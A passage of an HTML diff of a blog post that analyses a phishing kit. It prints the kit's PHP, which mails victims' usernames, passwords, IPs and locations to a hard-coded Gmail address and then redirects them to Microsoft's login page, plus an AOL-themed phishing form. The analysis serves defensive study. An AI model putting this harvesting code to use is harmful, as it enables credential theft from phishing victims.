 </span></span></code></pre></div><p>Using a switch, the kit detects which type of credentials were submitted by the phished user, and it changes the message and the subject of the email accordingly.</p>
-<p>In the rest of the code the headers and body of the email are set, then the email is sent using <code>mail()</code>. After that, the user is redirected to a login page of Microsoft: <em><a href="https://login.microsoftonline.com/common/oauth2">https://login.microsoftonline.com/common/oauth2</a></em>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Outlook &lt;noreply&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// To send HTML mail, the Content-type header must be set
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$headers  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;MIME-Version: 1.0&#39;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;Content-type: text/html; charset=iso-8859-1&#39;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Create email headers
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;From: &#39;</span><span style="color:#f92672">.</span>$from<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Reply-To: &#39;</span><span style="color:#f92672">.</span>$from<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">.</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;X-Mailer: PHP/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">phpversion</span>();
-</span></span><span style="display:flex;"><span>$headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-Type: text/html; charset=ISO-8859-1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// More headers
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Reply-To: &#34;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">strip_tags</span>($email) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Username/Email -- </span><span style="color:#e6db74">$email\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Password -- </span><span style="color:#e6db74">$password\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;IP --  &#34;</span><span style="color:#f92672">.</span>$ip<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Country Detected --  &#34;</span><span style="color:#f92672">.</span>$country<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Region Detected --  &#34;</span><span style="color:#f92672">.</span>$region<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;City Detected --  &#34;</span><span style="color:#f92672">.</span>$city<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Date --  &#34;</span><span style="color:#f92672">.</span>$adddate<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>$message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Browser Detected --  &#34;</span><span style="color:#f92672">.</span>$browser<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//send email
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">@</span><span style="color:#a6e22e">mail</span>($admin_email,$subject,$message);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: https://login.microsoftonline.com/common/oauth2&#39;</span>);
-</span></span></code></pre></div><h2 id="other-php-files">Other php files</h2>
+<p>In the rest of the code the headers and body of the email are set, then the email is sent using <code>mail()</code>. After that, the user is redirected to a login page of Microsoft: <em><a href="https://login.microsoftonline.com/common/oauth2" target="_blank" rel="noopener">https://login.microsoftonline.com/common/oauth2</a></em>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$from</span> <span class="o">=</span> <span class="s1">&#39;Outlook &lt;noreply&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// To send HTML mail, the Content-type header must be set
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$headers</span>  <span class="o">=</span> <span class="s1">&#39;MIME-Version: 1.0&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;Content-type: text/html; charset=iso-8859-1&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Create email headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$from</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Reply-To: &#39;</span><span class="o">.</span><span class="nv">$from</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;X-Mailer: PHP/&#39;</span> <span class="o">.</span> <span class="nx">phpversion</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;MIME-Version: 1.0&#34;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Content-Type: text/html; charset=ISO-8859-1</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// More headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Reply-To: &#34;</span><span class="o">.</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Username/Email -- </span><span class="si">$email\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Password -- </span><span class="si">$password\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;IP --  &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Country Detected --  &#34;</span><span class="o">.</span><span class="nv">$country</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Region Detected --  &#34;</span><span class="o">.</span><span class="nv">$region</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;City Detected --  &#34;</span><span class="o">.</span><span class="nv">$city</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Date --  &#34;</span><span class="o">.</span><span class="nv">$adddate</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Browser Detected --  &#34;</span><span class="o">.</span><span class="nv">$browser</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//send email
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nx">mail</span><span class="p">(</span><span class="nv">$admin_email</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: https://login.microsoftonline.com/common/oauth2&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><h2 id="other-php-files">Other php files<a hidden class="anchor" aria-hidden="true" href="#other-php-files">#</a></h2>
 <p>At this point, the workflow of the kit seems clear, however there are two php files that seem unrelated with the rest of the kit, because they are never called or included: <code>outlookcode/email.php</code> and <code>aol.php</code>.</p>
-<h3 id="outlookcodeemailphp">outlookcode/email.php</h3>
+<h3 id="outlookcodeemailphp">outlookcode/email.php<a hidden class="anchor" aria-hidden="true" href="#outlookcodeemailphp">#</a></h3>
 <p>This file seems to have the same purpose of <code>emailcode/email.php</code>, but is less sophisticated, as it does not contain the switch case to handle multiple phishing pages. Here is the code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;submit_btn&#39;</span>])){
-</span></span><span style="display:flex;"><span>    $admin_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;macdon161@gmail.com&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;email&#39;</span>];
-</span></span><span style="display:flex;"><span>    $password <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;password&#39;</span>];
-</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// $headers = &#34;From:&#34;.$email;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Always set content-type when sending HTML email
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-type:text/html;charset=UTF-8&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// More headers
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;From:&#39;</span><span style="color:#f92672">.</span>$email <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Recived data&#39;</span><span style="color:#f92672">.</span>$email;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;From: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">strip_tags</span>($email) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Reply-To: &#34;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">strip_tags</span>($email) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-Type: text/html; charset=ISO-8859-1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;html&gt;&lt;body&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;p&gt;Username: &#39;</span><span style="color:#f92672">.</span>$email<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;p&gt;&lt;br&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;p&gt;Password: &#39;</span><span style="color:#f92672">.</span>$password<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;p&gt;&lt;br&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span>;
-</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//send email
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mail</span>($admin_email, $subject, $message, $headers )){
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: https://login.microsoftonline.com/common/oauth2&#39;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//if &#34;email&#34; variable is not filled out, display the form
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;submit_btn&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$admin_email</span> <span class="o">=</span> <span class="s2">&#34;macdon161@gmail.com&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// $headers = &#34;From:&#34;.$email;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Always set content-type when sending HTML email
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&#34;MIME-Version: 1.0&#34;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Content-type:text/html;charset=UTF-8&#34;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// More headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;From:&#39;</span><span class="o">.</span><span class="nv">$email</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$subject</span> <span class="o">=</span> <span class="s1">&#39;Recived data&#39;</span><span class="o">.</span><span class="nv">$email</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&#34;From: &#34;</span> <span class="o">.</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Reply-To: &#34;</span><span class="o">.</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;MIME-Version: 1.0</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Content-Type: text/html; charset=ISO-8859-1</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;&lt;html&gt;&lt;body&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p&gt;Username: &#39;</span><span class="o">.</span><span class="nv">$email</span><span class="o">.</span><span class="s1">&#39;&lt;p&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p&gt;Password: &#39;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s1">&#39;&lt;p&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">//send email
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">mail</span><span class="p">(</span><span class="nv">$admin_email</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="nv">$headers</span> <span class="p">)){</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: https://login.microsoftonline.com/common/oauth2&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">//if &#34;email&#34; variable is not filled out, display the form
 </span></span></span></code></pre></div><p>Considering that the exfiltration email is included also here, I assume that this is just the code of an old version of the kit that was left in the zip by mistake&hellip; But who knows? 🤷</p>
-<h3 id="aolphp">aol.php</h3>
+<h3 id="aolphp">aol.php<a hidden class="anchor" aria-hidden="true" href="#aolphp">#</a></h3>
 <p>If we manually navigate to <code>aol.php</code> with our browser, we see the following:</p>
-<figure><img src="/images/posts/phishing-findings/ep1/aol.png"
-         alt="aol.php"/><figcaption>
-            <p>aol.php</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/aol.png#center"
+         alt="AOL phishing"/> <figcaption>
+            <p>Screenshot of aol.php</p>
         </figcaption>
 </figure>
 
 <p>It seems another phishing page, this time for an app which has email capabilities.</p>
 <p>Interacting with the page, we can notice that &lsquo;<em>Forgot Password?</em>&rsquo;, &lsquo;<em>Get a Free Username</em>&rsquo; and &lsquo;<em>Erase Hard Drive Junk Now</em>&rsquo; are not working, and the same applies to the &lsquo;<em>GET THE AOL APP</em>&rsquo; button. In the source code, they all have the <code>href</code> attribute equal to <code>javascript:void(0)</code>.</p>
-<figure><img src="/images/posts/phishing-findings/ep1/aolstore.png"
-         alt="AOL apps"/><figcaption>
-            <p>AOL apps</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/aolstore.png#center"
+         alt="AOL apps available"/> <figcaption>
+            <p>AOL apps for iPhone and Android</p>
         </figcaption>
 </figure>
 
 <p>Here is the form:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;?php
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">require_once(&#39;emailcode/email.php&#39;)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>
-</span></span><span style="display:flex;"><span>// SKIPPING NOT INTERESTING HTML
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;needs-validation&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">novalidate</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;validationCustom01&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email&#34;</span> <span style="color:#a6e22e">required</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;invalid-feedback&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>	    Enter Email Address
-</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;validationCustom02&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span> <span style="color:#a6e22e">required</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;invalid-feedback&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>	    Enter Password
-</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:void(0);&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;forgotBtn&#34;</span>&gt;Forgot Password?&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn stepBtn&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;Go to step 2&lt;/<span style="color:#f92672">button</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get-user&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:void(0);&#34;</span>&gt;Get a Free Username&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:void(0);&#34;</span>&gt;Erase Hard Drive Junk Now&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="cp">require_once(&#39;emailcode/email.php&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
+</span></span><span class="line"><span class="cl">// SKIPPING NOT INTERESTING HTML
